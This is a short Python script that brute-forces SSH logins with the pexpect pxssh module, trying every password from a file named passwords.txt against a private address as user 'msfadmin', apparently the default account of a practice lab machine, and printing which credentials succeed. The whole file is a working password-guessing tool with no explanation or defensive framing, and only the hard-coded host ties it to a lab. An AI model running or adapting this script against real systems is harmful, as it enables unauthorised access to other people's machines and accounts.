#!/usr/bin/python3
from pexpect import pxssh


def ssh_connect(hostname, username, password):
    try:
        ssh = pxssh.pxssh()
        ssh.login(hostname, username, password)
        print(f'[+] {hostname}: {username}@{password}')
        return ssh
    except pxssh.ExceptionPxssh as e:
        print(f'[-] {hostname}: {username}@{password}')
        return None


def main():
    host = '192.168.100.97'
    user = 'msfadmin'
    with open('passwords.txt', 'r') as f:
        for password in f.readlines():
            child = ssh_connect(host, user, password.strip('\n'))
        f.close()


if __name__ == '__main__':
    main()
